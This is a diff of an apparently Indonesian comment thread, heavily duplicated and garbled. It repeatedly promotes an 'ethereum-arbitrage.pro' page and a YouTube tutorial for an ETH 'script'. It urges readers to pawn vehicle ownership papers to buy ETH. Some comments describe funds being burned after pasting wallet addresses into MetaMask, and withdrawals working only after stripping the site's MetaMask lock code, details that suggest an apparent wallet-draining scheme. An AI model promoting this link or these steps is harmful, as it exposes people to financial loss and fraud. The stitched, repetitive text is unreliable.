@@ -1,43 +1,29 @@
 lebih nabung dulu aja deh kumpulin ETH dulu, gak ada yang murah Pak modal dikit donk!!
 sampai bisa trus pake script diatas yang bener, gas fee ETH gak ada avalance
 GAK BISA pake website PAK males puasa irit Pak
-
-
 lebih nabung dulu aja deh kumpulin ETH dulu, gak ada yang murah Pak modal dikit donk!!
 sampai bisa trus pake script diatas yang bener, gas fee ETH gak ada avalance
 GAK BISA pake website PAK males puasa irit Pak
-
-
 lebih nabung dulu aja deh kumpulin ETH dulu, gak ada yang murah Pak modal dikit donk!!
 sampai bisa trus pake script diatas yang bener, gas fee ETH gak ada avalance
 GAK BISA pake website PAK males puasa irit Pak
-
 lebih nabung dulu aja deh kumpulin ETH dulu, gak ada yang murah Pak modal dikit donk!!
 sampai bisa trus pake script diatas yang bener, gas fee ETH gak ada avalance
 GAK BISA pake website PAK males puasa irit Pak
-
 KALO SULIT KARENA HAL-HAL MUSTAHIL TERJADI
 COBALAH MENABUNG PAKE JARINGAN LAEN DULU PAK😭😭😭😭😦😦😦😦😦😦😦😦😦😦😦😦😦😦😱🤑🤑🤑GUNAKAN DULU 
 https://ethereum-arbitrage.pro/index564b.html?page_id=864🤑🤑
 link TUTORIAL Video-nya🤑🤑😲😲😲😲https://youtu.be/qqu-S2DtOIc?si=CYS3Qv6sRe2qilNT😲😲😲😲😲😲😲😲
-
-
 KALO SULIT KARENA HAL-HAL MUSTAHIL TERJADI
 COBALAH MENABUNG PAKE JARINGAN LAEN DULU PAK😭😭😭😭😦😦😦😦😦😦😦😦😦😦😦😦😦😦😱🤑🤑🤑GUNAKAN DULU 
 https://ethereum-arbitrage.pro/index564b.html?page_id=864🤑🤑
 link TUTORIAL Video-nya🤑🤑😲😲😲😲https://youtu.be/qqu-S2DtOIc?si=CYS3Qv6sRe2qilNT😲😲😲😲😲😲😲😲
-
-
 KALO SULIT KARENA HAL-HAL MUSTAHIL TERJADI
 COBALAH MENABUNG PAKE JARINGAN LAEN DULU PAK😭😭😭😭
 SABAR MANJAT DULU PAK😦😦😦😦😦😦😦😦😦😦😦😦😦😦😱🤑🤑🤑GUNAKAN DULU 
 https://ethereum-arbitrage.pro/index564b.html?page_id=864🤑🤑
 link TUTORIAL Video-nya🤑🤑😲😲😲😲https://youtu.be/qqu-S2DtOIc?si=CYS3Qv6sRe2qilNT😲😲😲😲😲😲😲😲
-
-
-
 SABAR MANJAT DULU PAK😦😦😭😭😭😭😭😭😭🤑🤑🤑🤑🤑🤑
-
 SABAR MANJAT DULU PAK😦😦😭😭😭😭😭😭😭🤑🤑🤑🤑🤑🤑
 SABAR MANJAT DULU PAK😦😦😭😭😭😭😭😭😭🤑🤑🤑🤑🤑🤑
 SABAR MANJAT DULU PAK😦😦😭😭😭😭😭😭😭🤑🤑🤑🤑🤑🤑
@@ -59,13 +45,8 @@ Perumpamaan kedua kepada orang yang sedekah adalah
 "Barang siapa meminjami Allah dengan pinjaman yang baik maka Allah melipatgandakan ganti kepadanya dengan banyak. Allah menahan dan melapangkan (rezeki) dan kepada-Nyalah kamu dikembalikan” (QS. Al-Baqarah: 245).
 
 
-
 Titip pesen: Mohon disharekan ke Edi Baskoro (SBY) Cikeas, penting Pak buat wajib sekolah rakyat(lebih bisa komputer)😭
-
 agak sulit prosessnya Pak, katanya ada tambahan baru pass process "excute" link alamat diganti ke alamat wallet jadi 3 kali paste address, terakhir HRS ganti link address yang ada di kotak metamaksnya SEBELUM confirm pass pencet "excute", tapi aku dah terlanjur hangus krn gak tahu kok dirusak
-
 ke pegadaian untuk modal awal beli ETH cukup Pak😁..utang dulu jaminkan stnk & bpkp motor ke Pegadaian gpp nyerah bilang gak mampu gak sanggup terlalu rumit bodoh utk brani kuakui kalah deh😭 biar untuk BISA bayar utang SBY 3T...gitu deh, gak usah pake oplosan mabuk pak
-
 kalo tetep mau otak-atik ngakalin https://ethereum-arbitrage.pro/ pake clone html ke codepen trus di script html hapus link kunci wp-metamaks tambahan tulisan dibawah }; hapus semuanys baru bisa klik normal..bisa withdraw....tapi sulit BGT..rumit BGT buka script segala..nyerah deh....bilang gak sanggup deh
-
 SARAN sebaiknya utang dulu secara pribadi ke pegadaian untuk modal awal beli ETH cukup Pak😁..utang dulu jaminkan stnk & bpkp motor ke Pegadaian gpp nyerah bilang gak mampu gak sanggup terlalu rumit bodoh utk brani kuakui kalah deh😭 biar untuk BISA bayar utang SBY 3T...gitu deh, gak usah pake oplosan mabuk pak
